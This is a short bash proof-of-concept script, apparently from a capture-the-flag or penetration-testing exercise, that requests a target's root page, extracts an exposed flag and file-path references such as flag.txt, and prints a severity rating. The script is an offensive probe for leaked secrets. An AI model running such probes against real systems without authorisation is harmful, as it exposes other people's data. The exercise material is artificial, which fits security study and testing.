#!/bin/bash

# POC: Flag Exposure via API Response - GET / endpoint
# This script demonstrates the exposure of sensitive flag data and application logic
# in the HTTP response body of the root endpoint

TARGET_URL="${1:-http://localhost:8080/}"
RESPONSE_FILE="/tmp/flag_response.html"

echo "[*] Testing for Flag Exposure in GET / endpoint"
echo "[*] Target URL: $TARGET_URL"
echo ""

# Make the GET request and capture response
echo "[*] Sending GET request to root endpoint..."
curl -s "$TARGET_URL" > "$RESPONSE_FILE"

# Check if response contains flag
if grep -q "flag" "$RESPONSE_FILE"; then
    echo "[+] FLAG EXPOSURE CONFIRMED!"
    echo ""
    echo "[+] Extracted Flag Information:"
    echo "---"
    grep -i "current flag" "$RESPONSE_FILE" | sed 's/^[[:space:]]*//g'
    echo ""
else
    echo "[-] No flag information found in response"
    exit 1
fi

# Check for code logic exposure
echo ""
echo "[+] Checking for Application Logic Disclosure:"
echo "---"
if grep -q "decoy.txt\|flag.txt" "$RESPONSE_FILE"; then
    echo "[+] CODE LOGIC EXPOSURE CONFIRMED!"
    echo "[+] Found references to file paths:"
    grep -o "[a-zA-Z0-9_]*\.txt" "$RESPONSE_FILE" | sort -u | sed 's/^/    - /'
    echo ""
else
    echo "[-] No application logic disclosure found"
fi

# Display full response for analysis
echo "[+] Full Response Body:"
echo "---"
cat "$RESPONSE_FILE"
echo ""

# Verify severity
echo "[+] VULNERABILITY ASSESSMENT:"
echo "    - Sensitive data (flag) directly accessible: YES"
echo "    - No authentication required: YES"
echo "    - Application logic exposed: YES"
echo "    - Severity: HIGH"
echo ""
echo "[*] POC Complete"

# Cleanup
rm -f "$RESPONSE_FILE"